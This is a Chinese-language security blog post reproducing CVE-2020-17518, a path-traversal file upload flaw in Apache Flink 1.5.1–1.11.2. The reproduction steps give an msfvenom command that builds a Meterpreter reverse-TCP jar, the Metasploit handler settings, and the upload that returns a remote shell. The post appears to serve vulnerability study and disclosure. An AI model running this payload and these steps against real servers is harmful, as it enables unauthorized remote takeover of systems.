---
title: Apache Flink  cve-2020-17518
layout: post
post-image: /assets/images/apacheflink.jpg
description: Flink 在 1.5.1 版本中引入了一个 REST handler，这允许攻击者将已上传的文件写入本地任意位置的文件中，并且可通过一个恶意修改的 HTTP 头将这些文件写入到 Flink 1.5.1 可以访问的任意位置
tags:
- 内网渗透
- Apache Flink
- 文件上传
---


# Apache Flink  cve-2020-17518

​                                                                                                                       ——Darren    

**1.****漏洞名称**：

**apache Flink 路径遍历漏洞（上传jar包）**

 

**2.****漏洞原理**：

**Flink 在 1.5.1 版本中引入了一个 REST handler，这允许攻击者将已上传的文件写入本地任意位置的文件中，并且可通过一个恶意修改的 HTTP 头将这些文件写入到 Flink 1.5.1 可以访问的任意位置**

 

**Flink 1.5.1-1.11.2中，允许文件上传到直接上传到服务器中的任意位置中**

**在用户上传一个文件时，filename是用户可以控制的，将filename的路径于服务器路径进行拼接**

 

**3.****受影响版本****：**

**Apache Flink 1.5.1 ~ 1.11.2**

 

**4.****漏洞复现：**

访问地址

![image-20211106102216628](/assets/images/20211106/image-20211106102216628.png)

使用kali生成一个jar文件

msfvenom ‐p java/meterpreter/reverse_tcp LHOST=ip LPORT=端口 ‐f jar > 名字.jar

![image-20211106102240945](/assets/images/20211106/image-20211106102240945.png)

![image-20211106102302878](/assets/images/20211106/image-20211106102302878.png)

接着打开msfconsole 设置攻击端口以及ip

`use exploit/multi/handler (选择攻击模块)`

`set lhost 0.0.0.0 （设置监听ip）0.0.0.0（代表监听所有流向12345的端口的流量）`

`set lport 12345 （设置监听端口）`

`set payload java/meterpreter/reverse_tcp （使用刚刚生成的payload）`

`show options` 

`run`

![image-20211106102403856](/assets/images/20211106/image-20211106102403856.png)

接着上传jar包

![image-20211106102420717](/assets/images/20211106/image-20211106102420717.png)

点击submit后，返回kali中查看反弹回来的shell

![image-20211106102434280](/assets/images/20211106/image-20211106102434280.png)

**5.****修复建议：**

升级flink的版本
